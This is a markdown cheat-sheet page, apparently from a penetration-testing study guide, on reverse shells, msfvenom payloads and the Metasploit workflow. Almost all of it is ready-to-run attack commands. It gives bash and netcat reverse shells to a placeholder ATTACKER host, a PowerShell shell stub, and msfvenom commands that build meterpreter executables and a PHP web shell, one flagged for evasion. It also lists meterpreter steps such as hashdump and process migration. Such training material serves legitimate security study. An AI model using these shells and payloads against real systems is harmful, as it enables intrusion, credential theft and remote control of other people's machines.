[← Back to Home](../README.md)

# 07 — Shells, Payloads & Metasploit

## Reverse Shells (the essential skill)

**Listener**
```bash
nc -lvnp 443
```

**Linux target**
```bash
bash -i >& /dev/tcp/ATTACKER/443 0>&1
# or
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER 443 > /tmp/f
```

**Windows target (PowerShell)**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',443);..."
```

## MSFvenom

```bash
# Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f exe -o shell.exe

# Windows reverse HTTPS (better evasion)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f elf -o shell.elf

# PHP web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f raw -o shell.php

# List available payloads
msfvenom -l payloads
```

## Metasploit Workflow

```bash
msfconsole -q
search <keyword>
use <module>
show options
set RHOSTS target
set LHOST tun0
set LPORT 443
run / exploit

# Meterpreter essentials
getuid
sysinfo
ps
migrate <PID>
hashdump
shell
background
sessions -i <ID>

# Database integration
workspace -a NAME
db_nmap -sV target
hosts / services / creds / loot

# Local exploit suggester
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

## Multi/Handler

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST tun0
set LPORT 443
run
```

## Related Pages

- File transfer to get your payload onto a target → [Service Exploitation Deep-Dive](03-Service-Exploitation-Deep-Dive.md)
- What to do once you have a shell → [Windows Enumeration](09-Windows-Enumeration-and-Situational-Awareness.md) · [Linux PrivEsc](12-Linux-Privilege-Escalation.md)
- Getting further into the network → [Pivoting & Tunneling](08-Pivoting-and-Tunneling.md)
